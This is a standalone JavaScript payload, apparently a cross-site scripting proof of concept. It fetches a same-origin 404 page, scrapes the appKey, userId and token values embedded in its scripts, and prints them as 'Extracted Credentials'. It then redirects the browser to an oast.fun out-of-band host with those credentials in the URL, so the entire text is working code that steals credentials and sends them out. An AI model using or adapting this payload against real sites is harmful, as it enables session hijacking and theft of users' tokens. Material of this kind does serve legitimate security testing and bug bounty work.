var getRequest = new XMLHttpRequest();
getRequest.open("GET", "/en/404.htm", false);
getRequest.send(null);

var parser = new DOMParser();
var doc = parser.parseFromString(getRequest.responseText, "text/html");

var scripts = doc.querySelectorAll("script");
var appKey, userId, token;

scripts.forEach(function(script) {
    var content = script.innerText || script.textContent;

    var appKeyMatch = content.match(/appKey:\s*['"]([^'"]+)['"]/);
    var userIdMatch = content.match(/userId:\s*['"]([^'"]+)['"]/);
    var tokenMatch  = content.match(/token:\s*['"]([^'"]+)['"]/);

    if (appKeyMatch) appKey = appKeyMatch[1];
    if (userIdMatch) userId = userIdMatch[1];
    if (tokenMatch)  token  = tokenMatch[1];
});

console.log("=== Extracted Credentials ===");
console.log("appKey:", appKey);
console.log("userId:", userId);
console.log("token:",  token);

const redirectUrl = `https://nxakditpmrtnwgggqkhjl4lih1svk8d3y.oast.fun/?appKey=${appKey}&userId=${userId}&token=${token}`;

console.log(`Redirecting to: ${redirectUrl}`);
window.location.href = redirectUrl;
